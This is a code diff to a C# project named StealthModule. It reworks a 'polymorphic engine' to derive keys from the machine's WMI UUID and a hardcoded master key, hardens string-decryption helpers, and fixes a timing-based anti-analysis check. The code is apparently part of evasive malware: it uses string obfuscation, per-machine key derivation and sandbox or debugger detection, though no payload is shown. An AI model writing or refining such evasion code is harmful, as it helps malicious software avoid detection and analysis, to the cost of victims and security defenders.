@@ -66,39 +66,56 @@ namespace StealthModule
         #region Polymorphic Engine
         private class PolymorphicEngine
         {
-            private static byte[] GenerateRandomKey(int size)
-            {
-                byte[] key = new byte[size];
-                using (var rng = new RNGCryptoServiceProvider())
-                {
-                    rng.GetBytes(key);
-                }
-                return key;
-            }
+            private static byte[] _masterKey;
+            private static byte[] _machineSalt;
 
             public static void InitializeKeys()
             {
-                AES_KEY = GenerateRandomKey(32); // 256-bit
-                XOR_SALT = GenerateRandomKey(16);
+                // Derive machine-specific salt
+                _machineSalt = Encoding.UTF8.GetBytes(GetMachineId().Substring(0, 16));
                 
-                // Self-modify keys every 5 minutes
-                Timer keyRotator = new Timer((state) => {
-                    AES_KEY = GenerateRandomKey(32);
-                    XOR_SALT = GenerateRandomKey(16);
-                }, null, TimeSpan.FromMinutes(5), TimeSpan.FromMinutes(5));
+                // Master key for decryption (obfuscated in real build)
+                _masterKey = new byte[] { 
+                    0x4A, 0x6E, 0x32, 0x78, 0x6B, 0x4E, 0x51, 0x59, 
+                    0x62, 0x5A, 0x77, 0x6A, 0x38, 0x72, 0x39, 0x66,
+                    0x7A, 0x4D, 0x31, 0x32, 0x33, 0x21, 0x40, 0x23,
+                    0x24, 0x25, 0x5E, 0x26, 0x2A, 0x28, 0x29, 0x5F
+                };
+
+                // Apply machine-specific XOR to the key for polymorphism
+                for (int i = 0; i < _masterKey.Length; i++)
+                    _masterKey[i] ^= _machineSalt[i % _machineSalt.Length];
+
+                AES_KEY = _masterKey;
+                XOR_SALT = _machineSalt;
+            }
+
+            private static string GetMachineId()
+            {
+                try
+                {
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                            return obj["UUID"].ToString();
+                    }
+                }
+                catch { }
+                return "DEFAULT_MACHINE_ID_SALT_1234567890";
             }
 
             public static string DStr(byte[] b)
             {
+                if (b == null || b.Length == 0) return "";
                 byte[] d = new byte[b.Length];
-                byte[] salt = XOR_SALT;
                 for (int i = 0; i < b.Length; i++)
-                    d[i] = (byte)(b[i] ^ salt[i % salt.Length]);
+                    d[i] = (byte)(b[i] ^ XOR_SALT[i % XOR_SALT.Length]);
                 return Encoding.UTF8.GetString(d);
             }
 
             public static string DAes(string protectedStr)
             {
+                if (string.IsNullOrEmpty(protectedStr)) return "";
                 try
                 {
                     byte[] fullCipher = Convert.FromBase64String(protectedStr);
@@ -1193,6 +1210,7 @@ namespace StealthModule
                 Thread.Sleep(1);
                 QueryPerformanceCounter(out tEnd);
                 
+                long qpcDiff = tEnd - tStart;
                 if (qpcDiff < 100) score += 20;
                 checks += 1;
             }
